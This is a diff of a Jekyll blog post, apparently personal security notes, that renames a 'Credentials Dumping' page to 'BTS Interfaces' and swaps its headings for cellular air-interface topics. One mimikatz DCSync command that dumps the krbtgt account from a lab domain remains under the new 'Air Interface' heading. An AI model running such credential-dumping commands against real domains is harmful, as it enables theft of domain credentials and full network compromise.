@@ -1,22 +1,21 @@
 ---
-title: 3 - Credentials Dumping
+title: 3 - BTS Interfaces
 author: RFS
 date: 2023-06-02
 category: Layer 2
 layout: post
-permalink: /credentials-dumping
-cover: https://sighingnow.github.io/jekyll-gitbook/assets/dinosaur.gif
+permalink: /bts-interfaces
+cover: /assets/dinosaur.gif
 ---
 
 
 
-## Local SAM
+## Air Interface (UM)
 ```powershell
 mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt
 ```
-## NTDS
+## Abis
 
-## LSSAS
 
 > ##### TIP
 >
